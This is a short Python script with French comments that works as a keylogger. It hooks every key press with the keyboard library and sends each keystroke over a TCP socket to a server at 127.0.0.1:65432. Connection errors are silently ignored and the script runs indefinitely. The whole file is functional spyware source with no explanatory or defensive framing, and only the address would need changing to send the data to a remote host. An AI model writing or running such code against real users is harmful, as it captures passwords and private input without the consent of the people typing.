import keyboard
import socket

# Adresse et port du serveur local
SERVER_IP = "127.0.0.1"
SERVER_PORT = 65432

def send_keypress(key):
    """Envoie chaque touche pressée au serveur."""
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((SERVER_IP, SERVER_PORT))
            s.sendall(str(key).encode())  # Envoi de la touche au serveur
    except ConnectionRefusedError:
        pass  # Si le serveur n'est pas en ligne, on ignore l'erreur

# Écoute les touches en continu
keyboard.on_press(send_keypress)
keyboard.wait()
